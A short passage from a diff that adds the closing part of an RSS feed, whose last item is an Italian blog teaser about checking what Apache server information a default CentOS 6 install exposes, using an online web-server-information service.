+Vediamo quali informazioni di apache possiamo rilevare su una CentOS 6 con le impostazioni di default.
+Come prima cosa andiamo su uno dei tantissimi siti che offrono un servizio online di Web Server Information.</description>
+    </item>
+    
+  </channel>
+</rss>
